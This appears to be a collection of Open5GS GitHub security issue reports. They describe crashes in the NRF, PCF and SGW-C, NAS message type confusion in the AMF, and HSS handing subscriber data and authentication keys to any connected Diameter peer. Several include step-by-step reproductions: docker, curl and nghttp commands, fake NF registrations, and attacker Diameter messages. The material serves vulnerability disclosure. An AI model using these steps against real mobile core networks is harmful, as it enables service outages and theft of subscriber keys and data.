items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts during inter-PLMN discovery forwarding if the original HTTP/2 client
disconnects before the Home-NRF response comes back.

The forwarding path stores a raw `ogs_sbi_stream_t *` inside `nrf_assoc`:

```c
typedef struct nrf_assoc_s {
    ...
    ogs_sbi_stream_t *stream;
} nrf_assoc_t;
```

```c
assoc->stream = stream;
```

When the delayed Home-NRF response arrives, `discover_handler()` reuses that raw
pointer without checking whether the original stream/session is still alive:

```c
stream = assoc->stream;
ogs_assert(stream);
...
ogs_expect(true == ogs_sbi_server_send_response(stream, response));
```

But if the original client timed out and disconnected first, nghttp2 closes the
stream and frees it:

```c
stream = nghttp2_session_get_stream_user_data(session, stream_id);
...
stream_remove(stream);
```

The later response send then walks into `server_send_rspmem_persistent()` with
an invalid socket and aborts:

```c
fd = sock->fd;
ogs_assert(fd != INVALID_SOCKET);
```

This is a distinct crash from the already documented inter-PLMN `SearchResult`
pool-exhaustion issues. Here the attacker only needs a delayed but otherwise
valid Home-NRF response plus a client disconnect.

### Root cause

- Entry route:
  `GET /nnrf-disc/v1/nf-instances`
- Preconditions:
  inter-PLMN forwarding path with `hnrf-uri`, and the original client must
  disconnect before the Home-NRF replies
- Raw association storage:
  `../src/nrf/context.h:44-48`
  and `../src/nrf/context.c:137-153`
- Response callback:
  `../src/nrf/nnrf-handler.c:1360-1405`
- Stream free on disconnect:
  `../lib/sbi/nghttp2-server.c:1306-1327`
- Exact crash site:
  `../lib/sbi/nghttp2-server.c:643`
- Root cause family:
  stale stream / use-after-free style response handling leading to assertion
  abort
- Controlling factor:
  delayed Home-NRF response timing relative to original client disconnect

### Steps to reproduce

1. Start a fake h2c Home-NRF on the Docker `open5gs` network:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker run --rm -d \
  --name hnrfctl \
  --network open5gs \
  --network-alias hnrfctl \
  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \
  node:24-alpine \
  node /srv/nrf_fake_hnrf.js
```

2. Control case: restart the local NRF and issue the inter-PLMN request with an
   immediate Home-NRF response:

```bash
docker restart nrf
sleep 2

docker run --rm --network open5gs curlimages/curl:8.10.1 \
  --http2-prior-knowledge -sS -i -m 8 --get \
  http://nrf.open5gs.org/nnrf-disc/v1/nf-instances \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'
```

3. Malicious case: switch the fake Home-NRF to delayed mode, restart the local
   NRF to clear the cached foreign UDR, then send the same request with a 1
   second client timeout so the original stream is closed before the delayed
   response returns:

```bash
printf 'delayed-control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker restart nrf
sleep 2

docker run --rm --network open5gs curlimages/curl:8.10.1 \
  --http2-prior-knowledge -sS -i -m 1 --get \
  http://nrf.open5gs.org/nnrf-disc/v1/nf-instances \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'

sleep 4
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' nrf
docker logs --tail 120 nrf 2>&1
```


### Logs

```shell
04/23 12:49:11.233: [sbi] INFO: RST_STREAM received: stream_id=1 (../lib/sbi/nghttp2-server.c:1288)
04/23 12:49:11.233: [sbi] ERROR: on_stream_close_callback() failed (5:STREAM_CLOSED) (../lib/sbi/nghttp2-server.c:1320)
04/23 12:49:13.245: [sbi] FATAL: server_send_rspmem_persistent: Assertion `fd != INVALID_SOCKET' failed. (../lib/sbi/nghttp2-server.c:643)
04/23 12:49:13.250: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

NRF should detect that the original client stream is already gone and drop the delayed Home-NRF response without aborting.

### Observed Behaviour

If the original inter-PLMN discovery client disconnects before the delayed Home-NRF reply arrives, NRF reuses a stale stream pointer and terminates with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: AMF accepts mismatched NAS message type inside Service Request NAS message container

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
## Summary

open5gs AMF decrypts and decodes the NAS message container carried by a Service
Request, then dispatches the decoded inner NAS message by its own message type
without checking that the inner type matches the outer expected Service Request
type.

As a result, a registered UE with a valid NAS security context can send a
Service Request whose NAS message container contains an encrypted Registration
Request. open5gs accepts the container, decodes the inner Registration Request,
and dispatches it to `gmm_handle_registration_update()` instead of rejecting the
inner/outer message type mismatch.

This is a NAS message container type-confusion / procedure-confusion bug. The
current proof demonstrates that Registration Update logic can run through a
Service Request container. It does not demonstrate authentication bypass,
cross-UE impact, or remote unauthenticated access.

## Environment

- **open5gs Version**: v2.7.7
- **RAN/UE**: UERANSIM/CoreTesting UE and gNB
- **Component**: open5gs AMF
- **Code path**: `src/amf/gmm-handler.c`, `gmm_handle_nas_message_container()`

## Affected component

- Component: open5gs AMF
- Area: 5G NAS Service Request / NAS message container handling
- Code path: `src/amf/gmm-handler.c`
- Finding key: `nas5gs.service_request.service_request.nas_message_container.message_type.cross_field`
- Verification status: dynamically confirmed

## Standards background

3GPP TS 24.501 describes the NAS message container as carrying the complete NAS
message associated with the outer procedure when non-cleartext IEs need to be
sent in protected form. For the Service Request procedure, a Service Request
containing a NAS message container is expected to carry a complete Service
Request message in that container, not an arbitrary 5GMM message.

A Service Request whose NAS message container decrypts to a Registration
Request is therefore an inner/outer message type mismatch and should be handled
as a protocol error, for example by rejecting the Service Request with an
appropriate 5GMM protocol-error cause.

This issue is distinct from the normal procedure-collision case where AMF
receives a separate Registration Request while a Service Request procedure is
ongoing. In this issue, the Registration Request is embedded inside the NAS
message container of the same Service Request message.

## Root cause

The Service Request update path passes the expected outer message type
`OGS_NAS_5GS_SERVICE_REQUEST` into the NAS message container helper:

```c
gmm_cause = gmm_handle_nas_message_container(
        ran_ue, amf_ue, OGS_NAS_5GS_SERVICE_REQUEST,
        &service_request->nas_message_container);
```

However, after `gmm_handle_nas_message_container()` decrypts and decodes the
container payload, it dispatches by the decoded inner message type:

```c
switch (nas_message.gmm.h.message_type) {
case OGS_NAS_5GS_REGISTRATION_REQUEST:
    gmm_handle_registration_update(ran_ue, amf_ue,
            &nas_message.gmm.registration_request);
    break;
case OGS_NAS_5GS_SERVICE_REQUEST:
    gmm_handle_service_update(ran_ue, amf_ue,
            &nas_message.gmm.service_request);
    break;
}
```

The `message_type` parameter is the caller's expected outer type. It is used for
container processing, but there is no final validation such as:

```c
if (nas_message.gmm.h.message_type != message_type) {
    return OGS_5GMM_CAUSE_PROTOCOL_ERROR_UNSPECIFIED;
}
```

Therefore, an inner Registration Request can be accepted and dispatched while
the outer container context is a Service Request.

For comparison, free5gc explicitly checks this condition in its Service Request
handler:

```go
if messageType != nas.MsgTypeServiceRequest {
    return errors.New("The payload of NAS message Container is not service request")
}
```

## Dynamic verification

The issue was reproduced with UERANSIM/CoreTesting. The UE was patched with a
temporary state-learner command, `serviceRequestContainerRR`, that sends a
Service Request carrying an encrypted Registration Request in its NAS message
container.

The AMF was also patched with a temporary debug probe immediately before the
inner message dispatch in `gmm_handle_nas_message_container()`:

```c
ogs_info("[PROBE] NAS_CONTAINER_TYPE_CHECK outer_expected=%d inner_decoded=%d",
         message_type, nas_message.gmm.h.message_type);
```

The verifier records the AMF log offset after registration completes and before
the malicious Service Request is sent. This avoids a false positive from the
normal SecurityModeComplete path, which can also carry a Registration Request in
a NAS message container during registration.

The test drove the following sequence:

```text
Registration Request
Authentication Request
Authentication Response
Security Mode Command
Security Mode Complete
Registration Accept
Registration Complete
Service Request with encrypted Registration Request in NAS message container
```

### AMF log evidence

The attack-only AMF log window shows that the outer expected type was Service
Request (`76`), while the decoded inner type was Registration Request (`65`):

```text
Service request
[PROBE] gmm_handle_service_request called
[PROBE] gmm_handle_service_update called
[PROBE] NAS_CONTAINER_TYPE_CHECK outer_expected=76 inner_decoded=65
[PROBE] gmm_handle_registration_update called
```

The PoC verdict reported:

```text
[verdict] probe-hits in attack window: 2
  outer_expected= 76 (ServiceRequest)  inner_decoded= 65 (RegistrationRequest)  MISMATCH
  outer_expected= 76 (ServiceRequest)  inner_decoded= 65 (RegistrationRequest)  MISMATCH

>>> BUG CONFIRMED
    Service Request container (outer=76) dispatched as
    Registration-Request update (inner=65) -- type mismatch not checked.
```

This confirms that open5gs accepted the mismatched NAS message container and
called `gmm_handle_registration_update()` instead of rejecting the malformed
Service Request container.

### PoC notes

The reproducer is `poc.py` in this directory. It performs a one-shot test:

1. Patch UERANSIM with `serviceRequestContainerRR`.
2. Patch open5gs AMF with the temporary `NAS_CONTAINER_TYPE_CHECK` probe.
3. Build `nr-ue` and `open5gs-amfd`.
4. Start open5gs, gNB, and UE.
5. Complete registration and record the AMF log offset.
6. Send the malicious Service Request container.
7. Parse only the post-offset AMF log window for `outer_expected=76` and
   `inner_decoded=65`.

Two verifier issues were fixed during validation:

- The verdict no longer relies on globally searching for
  `gmm_handle_registration_update`, because normal registration can also call
  that function. Only the attack-only probe window is used.
- `statelearner.log` is removed and recreated as the current user before the
  test, avoiding a stale `root:root` log file that caused the ordinary UE
  process to lose the state-learner socket path during command handling.

## Expected behavior

When a Service Request includes a NAS message container, AMF should verify that
the decoded inner NAS message is a Service Request. If the container decrypts to
a different 5GMM message type, AMF should reject the malformed message with an
appropriate protocol-error cause.

The AMF should not dispatch an inner Registration Request from inside a Service
Request NAS message container to the Registration Update handler.

## Actual behavior

When a registered UE sends a Service Request whose NAS message container
contains an encrypted Registration Request:

1. `gmm_handle_service_update()` calls `gmm_handle_nas_message_container()` with
   expected outer type `OGS_NAS_5GS_SERVICE_REQUEST`.
2. The helper decrypts and decodes the container payload.
3. The decoded inner type is `OGS_NAS_5GS_REGISTRATION_REQUEST`.
4. open5gs does not check the inner type against the expected outer type.
5. open5gs dispatches the inner message to `gmm_handle_registration_update()`.

## Security impact

Severity: **Low-Medium; Medium if additional concrete state impact is
demonstrated.**

A registered UE with a valid NAS security context can inject a Registration
Request inside a Service Request NAS message container and cause open5gs AMF to
run Registration Update logic in the context of a Service Request procedure.
This is a security-relevant robustness and state-machine conformance bug:
malformed input is accepted and dispatched to the wrong NAS procedure instead
of being rejected.

The current dynamic proof confirms procedure confusion:

- `outer_expected=76` (`ServiceRequest`)
- `inner_decoded=65` (`RegistrationRequest`)
- AMF calls `gmm_handle_registration_update()`

The current proof does not demonstrate a stronger impact such as authentication
bypass, cross-UE modification, remote unauthenticated access, specific UE
context corruption, forced PDU session churn, NSSAI mutation, GUTI reassignment
anomaly, or AMF response/state desynchronization. If one of those effects is
demonstrated, the severity can reasonably be raised to Medium.

## Suggested fix

Add an explicit type check after the NAS message container is decoded and before
dispatching by `nas_message.gmm.h.message_type`:

```c
if (nas_message.gmm.h.message_type != message_type) {
    ogs_error("NAS message container type mismatch: outer expected %d, inner decoded %d",
              message_type, nas_message.gmm.h.message_type);
    return OGS_5GMM_CAUSE_PROTOCOL_ERROR_UNSPECIFIED;
}
```

`OGS_5GMM_CAUSE_PROTOCOL_ERROR_UNSPECIFIED` is cause #111 in open5gs. It is a
conservative fit for this Service Request protocol error; another TS
24.501-compatible Service Request reject cause for malformed NAS container
contents would also be reasonable.

Additional hardening:

- Add a regression test for a Service Request NAS message container that
  decrypts to Registration Request.
- Add tests for all NAS message container callers to ensure the decoded inner
  message type matches the caller's expected message type.
- Keep the existing normal SecurityModeComplete container behavior covered so
  the fix does not reject valid registration-time NAS container handling.

items.title: [Bug]: PCF crash on malformed BSF register `Location` during `POST /npcf-smpolicycontrol/v1/sm-policies`

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


### Description

PCF aborts while processing the `NBSF_MANAGEMENT` registration response that is
triggered from `POST /npcf-smpolicycontrol/v1/sm-policies`.

The vulnerable handler is `pcf_nbsf_management_handle_register()` in
`src/pcf/nbsf-handler.c`. It initializes `status = 0`, then jumps to
`cleanup:` on several malformed BSF response paths without assigning an HTTP
status first:

- `ogs_sbi_parse_header()` failure for `recvmsg->http.location`
- parsed URI missing `resource.component[1]` (`bindingId`)
- `ogs_sbi_getaddr_from_uri()` failure on the returned `Location`
- `ogs_sbi_client_add()` failure after parsing the returned `Location`

`cleanup:` then executes:

```c
ogs_assert(strerror);
ogs_assert(status);
```

So a malicious BSF can kill PCF by returning `201 Created` with a malformed
`Location` header. In the live repro below, the only malicious change was to
remove `{bindingId}` from:

```text
http://10.33.33.1:18080/nbsf-management/v1/pcfBindings/{bindingId}
```

This is distinct from the existing delayed-discovery crash report under
`report/pcf/npcf-smpolicycontrol-delayed-bsf-discovery-response-after-client-disconnect-assert-segfault.md`:

- different crash site: `src/pcf/nbsf-handler.c:139` vs `src/pcf/nnrf-handler.c:96`
- different trust boundary: malformed BSF response vs late NRF discovery result
- different root cause: uninitialized cleanup status vs stale stream assertion

### Root cause

Relevant code in `src/pcf/nbsf-handler.c`:

```c
int rv, status = 0;
...
rv = ogs_sbi_parse_header(&message, &header);
if (rv != OGS_OK) {
    strerror = ogs_msprintf("[%s:%d] Cannot parse http.location [%s]",
            pcf_ue_sm->supi, sess->psi, recvmsg->http.location);
    goto cleanup;
}

if (!message.h.resource.component[1]) {
    strerror = ogs_msprintf("[%s:%d] No Binding ID [%s]",
            pcf_ue_sm->supi, sess->psi, recvmsg->http.location);
    ogs_sbi_header_free(&header);
    goto cleanup;
}
...
cleanup:
    ogs_assert(strerror);
    ogs_assert(status);
```

The attacker controls `recvmsg->http.location` through the BSF `201 Created`
response. When the `Location` is malformed but still reaches one of the above
branches, `status` is still zero and the assertion aborts the PCF process.

### Steps to reproduce

This live validation used the existing Docker lab and two fake peer services on
the host at `10.33.33.1:18080`:

- fake UDR: returns minimal valid `SmPolicyData` so the home-path request
  proceeds to BSF in this lab
- fake BSF: returns `201 Created` and echoes the incoming `PcfBinding` JSON,
  while switching only the `Location` header between control and malicious modes

The home-path bridge via fake UDR was only needed because this PCF instance had
no serving PLMN configured, so `ogs_sbi_supi_in_vplmn()` never took the direct
VPLMN-to-BSF branch. The crash itself is in BSF response handling.

1. Start a cleartext HTTP/2 fake UDR/BSF on the host, reachable from the PCF
   container at `10.33.33.1:18080`.
2. Register a fake BSF NF instance through the PCF callback:

```bash
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pcf)

cat >/tmp/fake_bsf_notify.json <<'EOF'
{"event":"NF_REGISTERED","nfInstanceUri":"http://fake-bsf-loc.open5gs.org/nnrf-nfm/v1/nf-instances/fake-bsf-loc","nfProfile":{"nfInstanceId":"fake-bsf-loc","nfType":"BSF","nfStatus":"REGISTERED","nfServices":[{"serviceInstanceId":"fake-bsf-svc","serviceName":"nbsf-management","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18080}]}]}}
EOF

nghttp -v -H':method: POST' -H'content-type: application/json' \
  -d /tmp/fake_bsf_notify.json \
  "http://$IP/nnrf-nfm/v1/nf-status-notify"
```

3. Register a fake UDR NF instance the same way, pointing `nudr-dr` to the
   same host endpoint:

```bash
cat >/tmp/fake_udr_notify.json <<'EOF'
{"event":"NF_REGISTERED","nfInstanceUri":"http://fake-udr-loc.open5gs.org/nnrf-nfm/v1/nf-instances/fake-udr-loc","nfProfile":{"nfInstanceId":"fake-udr-loc","nfType":"UDR","nfStatus":"REGISTERED","nfServices":[{"serviceInstanceId":"fake-udr-svc","serviceName":"nudr-dr","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18080}]}]}}
EOF

nghttp -v -H':method: POST' -H'content-type: application/json' \
  -d /tmp/fake_udr_notify.json \
  "http://$IP/nnrf-nfm/v1/nf-status-notify"
```

4. Deregister the real UDR from the PCF cache so discovery resolves to the fake
   UDR in this lab:

```bash
REAL_UDR_ID=$(docker logs pcf 2>&1 | \
  rg -o '\[[0-9a-f-]{36}\] \(NRF-profile-get\) NF registered' | \
  tail -n 1 | sed -E 's/^\[([^]]+)\].*/\1/')

cat >/tmp/real_udr_deregister.json <<EOF
{"event":"NF_DEREGISTERED","nfInstanceUri":"http://udr.open5gs.org/nnrf-nfm/v1/nf-instances/$REAL_UDR_ID"}
EOF

nghttp -v -H':method: POST' -H'content-type: application/json' \
  -d /tmp/real_udr_deregister.json \
  "http://$IP/nnrf-nfm/v1/nf-status-notify"
```

5. Send the SM Policy Association request:

```bash
cat >/tmp/sm_policy_req.json <<'EOF'
{"supi":"imsi-999700123456789","pduSessionId":1,"pduSessionType":"IPV4","dnn":"internet","notificationUri":"http://smf.open5gs.org/nsmf-callback/v1/sm-policies/notify","ipv4Address":"10.45.0.2","sliceInfo":{"sst":1,"sd":"010203"}}
EOF
```

6. Control case: fake BSF returns
   `Location: http://10.33.33.1:18080/nbsf-management/v1/pcfBindings/binding-ok`
   and echoes the incoming `PcfBinding` JSON body.

```bash
printf control >/tmp/bsf_mode
nghttp -v -H':method: POST' -H'content-type: application/json' \
  -d /tmp/sm_policy_req.json \
  "http://$IP/npcf-smpolicycontrol/v1/sm-policies"
```

7. Malicious case: keep the same `201 Created` status and same JSON body, but
   remove only `{bindingId}` from the BSF `Location` header:

```text
http://10.33.33.1:18080/nbsf-management/v1/pcfBindings
```

```bash
printf crash >/tmp/bsf_mode
nghttp -v -H':method: POST' -H'content-type: application/json' \
  -d /tmp/sm_policy_req.json \
  "http://$IP/npcf-smpolicycontrol/v1/sm-policies"
```

### Logs

```shell
Control case:


[fake server] GET /nudr-dr/v1/policy-data/ues/imsi-999700123456789/sm-data?...
[fake server] POST /nbsf-management/v1/pcfBindings



HTTP/2 404
{"title":"[imsi-999700123456789:1] Cannot find SUPI in DB","status":404}


PCF did not restart in the control case.

Malicious case:


[fake server] GET /nudr-dr/v1/policy-data/ues/imsi-999700123456789/sm-data?...
[fake server] POST /nbsf-management/v1/pcfBindings


Client-visible failure:


Some requests were not processed. total=1, processed=0


PCF logs:


04/11 17:39:26.379: [pcf] FATAL: pcf_nbsf_management_handle_register: Assertion `status' failed. (../src/pcf/nbsf-handler.c:139)
04/11 17:39:26.383: [core] FATAL: backtrace() returned 10 addresses


Container state after the malicious request:


running=true restart=2 started=2026-04-11T17:39:26.665849472Z finished=2026-04-11T17:39:26.642113694Z
```

### Expected behaviour

PCF should reject malformed BSF `Location` headers with a normal `4xx/5xx` response instead of aborting the process.

### Observed Behaviour

An immediate malformed BSF register response reaches `cleanup:` with `status == 0`, triggers `ogs_assert(status)`, and restarts the PCF container.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.body: ### Open5GS Release, Revision, or Tag v2.7.6 ### Steps to reproduce ## Summary When handling S6a Update-Location-Request (ULR), the HSS does not verify whether the sender is an authorized MME for the target subscriber. As a result, any connected Diameter peer can send a ULR with an arbitrary IMSI and receive the subscriber's full Subscription-Data (including MSISDN, AMBR, APN configuration, network access mode, etc.) in the ULA response. ## Steps to Reproduce 1. UE (IMSI: `460060123456001`) is provisioned in the HSS database with valid subscriber data. 2. HSS is connected to the legitimate MME (`mme.epc.mnc006.mcc460.3gppnetwork.org`). 3. A malicious Diameter peer (`attacker.epc.mnc006.mcc460.3gppnetwork.org`) establishes a Diameter connection to the HSS. 4. The malicious peer sends a ULR targeting the UE: Diameter Protocol Version: 0x01 Length: 312 Flags: 0x80, Request Command Code: 3GPP-Update-Location (316) ApplicationId: 3GPP S6a/S6d (16777251) AVP: Session-Id(263) l=18 f=-M- val=ulr_normal AVP: Auth-Session-State(277) l=12 f=-M- val=NO_STATE_MAINTAINED (1) AVP: Origin-Host(264) l=50 f=-M- val=attacker.epc.mnc006.mcc460.3gppnetwork.org AVP: Origin-Realm(296) l=41 f=-M- val=epc.mnc006.mcc460.3gppnetwork.org AVP: Destination-Host(293) l=45 f=-M- val=hss.epc.mnc006.mcc460.3gppnetwork.org AVP: Destination-Realm(283) l=41 f=-M- val=epc.mnc006.mcc460.3gppnetwork.org AVP: User-Name(1) l=23 f=-M- val=460060123456001 AVP: Visited-PLMN-Id(1407) l=15 f=VM- vnd=TGPP val=MCC 460 China, MNC 000 AVP: RAT-Type(1032) l=16 f=VM- vnd=TGPP val=EUTRAN (1004) AVP: ULR-Flags(1405) l=16 f=VM- vnd=TGPP val=33 Note that Origin-Host is `attacker.epc...` — HSS never checks this. ULR-Flags is set to 33 (0x00000021), which includes Initial-Attach-Indicator and Skip-Subscriber-Data is NOT set, instructing the HSS to include full Subscription-Data in the response. 5. HSS returns a ULA (Update-Location-Answer) with `DIAMETER_SUCCESS` containing the subscriber's full Subscription-Data. ## Root Cause Analysis The ULR handler is in `src/hss/hss-s6a-path.c`, function `hss_ogs_diam_s6a_ulr_cb()`. The processing logic is: 1. Extract IMSI from `User-Name` AVP 2. Extract `Origin-Host` and `Origin-Realm` — but only to **store them in the database** as the subscriber's serving MME identity, not to verify authorization 3. Query subscriber data from database via `hss_db_subscription_data()` 4. Build Subscription-Data AVP with all subscriber information 5. Return `DIAMETER_SUCCESS` with full Subscription-Data The Origin-Host extracted in step 2 is used solely to update the `mme_host` / `mme_realm` fields in the database — it is never compared against any authorized MME list. This means the attacker's identity is actually **written into the database** as the subscriber's serving MME, which has the additional side effect of hijacking the subscriber's HSS registration. ## Leaked Data The Subscription-Data returned in the ULA contains: | Field | Description | |-------|-------------| | **MSISDN** | Subscriber's phone number | | **Subscriber-Status** | Active/inactive status | | **Network-Access-Mode** | EPS-only, CSFB, etc. | | **Access-Restriction-Data** | Roaming and access restrictions | | **AMBR** | Aggregate Maximum Bit Rate (uplink/downlink) | | **APN-Configuration-Profile** | Full APN configuration including APN names, QoS parameters (QCI, ARP), PDN type | | **Subscribed-Periodic-RAU-TAU-Timer** | Timer configuration | | **3GPP-Charging-Characteristics** | Charging profile | ### Logs ```shell HSS processes the ULR silently — no warning or error about unrecognized sender. The ULA response containing Subscription-Data is returned normally. ``` ### Expected behaviour HSS should verify that the ULR comes from an authorized MME. If the request comes from an unrecognized or unauthorized source, HSS should reject it with an appropriate Diameter error code (e.g., DIAMETER_AUTHORIZATION_REJECTED) and not return Subscription-Data or update the serving MME registration. At minimum, HSS should: 1. Maintain a list of authorized MME identities 2. Verify Origin-Host against the authorized list before processing ULR 3. Reject ULR from peers not in the authorized list 4. Not overwrite the subscriber's serving MME identity based on an unverified ULR ### Observed Behaviour HSS accepts the ULR from any connected Diameter peer regardless of identity and returns `DIAMETER_SUCCESS` with the subscriber's full Subscription-Data (MSISDN, AMBR, APN configuration, etc.). No warning or error is logged. ### eNodeB/gNodeB OpenAirInterface eNB ### UE Models and versions Commercial Smartphone Samsung Galaxy S24+

items.body: ### Open5GS Release, Revision, or Tag v2.7.6 ### Steps to reproduce ## Summary When handling S6a Authentication-Information-Request (AIR), the HSS returns full authentication vectors (RAND, XRES, AUTN, KASME) to any connected Diameter peer without verifying that the sender is the target UE's serving MME. Any authenticated Diameter peer can request authentication vectors for any IMSI. ## Steps to Reproduce 1. UE (IMSI: `460060123456001`) is provisioned in the HSS database with valid subscriber credentials. 2. HSS is connected to the legitimate MME (`mme.epc.mnc006.mcc460.3gppnetwork.org`). 3. A malicious Diameter peer (`attacker.epc.mnc006.mcc460.3gppnetwork.org`) establishes a Diameter connection to the HSS. 4. The malicious peer sends an AIR targeting the UE: Diameter Protocol Version: 0x01 Length: 452 Flags: 0x80, Request Command Code: 3GPP-Authentication-Information (318) ApplicationId: 3GPP S6a/S6d (16777251) AVP: Session-Id(263) l=114 f=-M- val=air_kasme_steal;DiameterIdentity{attacker.epc.mnc006.mcc460.3gppnetwork.org}... AVP: Auth-Session-State(277) l=12 f=-M- val=NO_STATE_MAINTAINED (1) AVP: Origin-Host(264) l=50 f=-M- val=attacker.epc.mnc006.mcc460.3gppnetwork.org AVP: Origin-Realm(296) l=41 f=-M- val=epc.mnc006.mcc460.3gppnetwork.org AVP: Destination-Realm(283) l=41 f=-M- val=epc.mnc006.mcc460.3gppnetwork.org AVP: Destination-Host(293) l=45 f=-M- val=hss.epc.mnc006.mcc460.3gppnetwork.org AVP: User-Name(1) l=23 f=-M- val=460060123456001 AVP: Vendor-Specific-Application-Id(260) l=32 f=-M- AVP: Visited-PLMN-Id(1407) l=15 f=VM- vnd=TGPP val=MCC 460 China, MNC 000 AVP: Requested-EUTRAN-Authentication-Info(1408) l=44 f=VM- vnd=TGPP Note that the Diameter peer identity is `attacker.epc...`, Session-Id also contains `attacker.epc...`, and Origin-Host is also `attacker.epc...`. HSS never checks any of these — it processes the AIR purely based on the IMSI in User-Name. 5. HSS returns an AIA (Authentication-Information-Answer) with `DIAMETER_SUCCESS` containing a full E-UTRAN authentication vector (RAND, XRES, AUTN, KASME). ## Root Cause Analysis The AIR handler is in `src/hss/hss-s6a-path.c`, function `hss_ogs_diam_s6a_air_cb()`. The processing logic is: 1. Extract IMSI from `User-Name` AVP 2. Query database for subscriber authentication data (`hss_db_auth_info`) 3. Generate authentication vector using Milenage (RAND, XRES, AUTN, KASME) 4. Increment SQN in database 5. Return `DIAMETER_SUCCESS` with E-UTRAN-Vector There is no step that checks who sent the request. The function does not extract or verify Origin-Host / Origin-Realm. HSS has no mechanism to verify that the requesting node is an authorized MME for this subscriber. ## Security Impact The leaked authentication vector contains: - **RAND**: random challenge - **XRES**: expected response (allows verifying UE identity) - **AUTN**: authentication token (allows UE to verify network) - **KASME**: root session key (derived from the subscriber's permanent key K) With these materials, an attacker can: - Impersonate the legitimate network to the UE (using AV) - Derive all session keys for encryption and integrity protection (from KASME) - Set up a fakebase station and fake core-network to intercept the subscriber's communications Additionally, each AIR causes the HSS to **increment the SQN** (sequence number) in the database. This side effect can cause the legitimate MME's subsequent authentication to fail due to SQN desynchronization, resulting in a secondary denial-of-service impact. ### Logs ```shell 03/01 12:26:50.970: [app] INFO: Configuration: '/open5gs/install/etc/open5gs/hss.yaml' (../lib/app/ogs-init.c:144) 03/01 12:26:50.970: [app] INFO: File Logging: '/open5gs/install/var/log/open5gs/hss.log' (../lib/app/ogs-init.c:147) 03/01 12:26:50.974: [dbi] INFO: MongoDB URI: 'mongodb://172.22.0.2/open5gs' (../lib/dbi/ogs-mongoc.c:130) 03/01 12:26:51.019: [app] INFO: Polling freeDiameter stats every 60000000 usecs (../lib/diameter/common/stats.c:77) 03/01 12:26:51.020: [app] INFO: HSS initialize...done (../src/hss/app-init.c:31) 03/01 12:26:51.022: [diam] INFO: CONNECTED TO 'mme.epc.mnc006.mcc460.3gppnetwork.org' (SCTP,soc#16): (../lib/diameter/common/logger.c:81) 03/01 12:27:16.529: [diam] INFO: CONNECTED TO 'attacker.epc.mnc006.mcc460.3gppnetwork.org' (TCP,soc#12): (../lib/diameter/common/logger.c:81) ``` ### Expected behaviour HSS should verify that the AIR comes from an authorized MME. If the request comes from an unrecognized or unauthorized source, HSS should reject it with an appropriate Diameter error code (e.g., DIAMETER_AUTHORIZATION_REJECTED) and not return authentication vectors. At minimum, HSS should: - Extract and log the Origin-Host from AIR requests - Maintain a list of authorized MME identities - Reject AIR from peers not in the authorized list ### Observed Behaviour HSS accepts the AIR from any connected Diameter peer regardless of identity and returns `DIAMETER_SUCCESS` with a full E-UTRAN authentication vector (RAND, XRES, AUTN, KASME). No warning or error is logged. The HSS also increments the subscriber's SQN as a side effect, which can cause SQN desynchronization for the legitimate MME. ### eNodeB/gNodeB OpenAirInterface eNB ### UE Models and versions Commercial Smartphone Samsung Galaxy S24+

labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

Open5GS v2.7.5 and earlier

### Steps to reproduce

In Open5GS v2.7.5 and earlier versions, the SGW-C does not properly validate the S11 transaction object (s11_xact) associated with a session when processing a PFCP Session Modification Response.

This issue typically occurs due to a race condition between the session release procedure and the arrival of a PFCP modification response. After the SGW-C receives a GTPv2-C Delete Session Response, it sends a PFCP Session Deletion Request to the SGW-U to release user-plane resources and subsequently cleans up the session context as well as the associated S11 transaction object.

If there is an outstanding PFCP Session Modification transaction and its response arrives at the SGW-C after the cleanup has already been performed, the function sgwc_sxa_handle_session_modification_response() directly dereferences the already freed s11_xact pointer. This triggers an assertion failure and ultimately causes the SGW-C process to crash.

